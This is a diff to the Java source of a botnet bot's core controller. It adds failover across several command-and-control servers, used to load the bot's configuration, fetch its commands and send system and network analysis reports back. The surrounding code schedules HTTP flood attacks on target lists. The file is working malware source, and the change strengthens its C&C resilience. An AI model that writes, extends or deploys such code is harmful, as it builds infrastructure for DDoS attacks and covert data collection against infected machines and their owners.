@@ -32,6 +32,7 @@ import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
 import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.exception.*;
@@ -85,7 +86,15 @@ public class CoreController {
    */
   private static BotPool POOL;
 
+  /**
+   * The configured analyzers.
+   */
   private static List<Analyzer> ANALYZERS = new ArrayList<>();
+
+  /**
+   * The current CC.
+   */
+  private static Controller CONTROLLER;
 
   /**
    * The bot entry-point.
@@ -185,17 +194,28 @@ public class CoreController {
 
   /**
    * Executes the state `JOIN`.
-   * Establishes a connection with the CC and make the bot join the botnet.
+   * Establishes a connection with the controller and make the bot join the botnet.
    * @throws  BotInitializationException when errors during botnet joining.
    */
   public static void joinBotnet() throws BotInitializationException {
     LOGGER.traceEntry("Joining botnet...");
-    final String initResource = AppConfigurationService.getConfigurations().getInitResource();
-    LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
-    try {
-      AppConfigurationService.loadJsonResource(initResource);
-    } catch (IOException exc) {
-      throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
+    boolean success = false;
+    int controllerId = 0;
+    while (!success) {
+      Controller controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
+      final String initResource = controller.getInitResource();
+      LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
+      try {
+        AppConfigurationService.loadJsonResource(initResource);
+        CONTROLLER = controller;
+        success = true;
+      } catch (IOException exc) {
+        if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
+          controllerId ++;
+        } else {
+          throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
+        }
+      }
     }
     LOGGER.trace("Botnet joined");
     allocateResources();
@@ -297,7 +317,7 @@ public class CoreController {
    * @throws BotCommandParsingException when command resource is unreachable.
    */
   private static BotCommand getNextCommand() throws BotCommandParsingException {
-    final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
+    final String cmdResource = CONTROLLER.getCmdResource();
     LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
     BotCommand cmd;
     try {
@@ -310,7 +330,7 @@ public class CoreController {
 
   /**
    * Executes the bot command `RESTART`.
-   * @param resource the path to the CC initialization resource.
+   * @param resource the path to the CONTROLLERS initialization resource.
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
   private static void restartBot(String resource) throws BotExecutionException {
@@ -400,7 +420,7 @@ public class CoreController {
   private static void scheduleHttpAttack(HttpMethod method, List<HttpTarget> targets) {
     LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
     LOGGER.info("Scheduling attack...");
-    targets.stream().forEach(target -> {
+    targets.forEach(target -> {
       HttpAttack attacker = new HttpAttack(method, target);
       POOL.submit(attacker);
     });
@@ -425,12 +445,12 @@ public class CoreController {
   }
 
   /**
-   * Sends analysis reports to CC, as specified in {@link AppConfiguration}.
+   * Sends analysis reports to CONTROLLERS, as specified in {@link AppConfiguration}.
    * @param report the report to send.
-   * @throws BotExecutionException when bot cannot send report to CC.
+   * @throws BotExecutionException when bot cannot send report to CONTROLLERS.
    */
   private static void sendReport(Report report) throws BotExecutionException {
-    final String logResource = AppConfigurationService.getConfigurations().getLogResource();
+    final String logResource = CONTROLLER.getLogResource();
     LOGGER.info("Sending analysis to C&C at {}...", logResource);
     final String json = report.toJson();
     try {
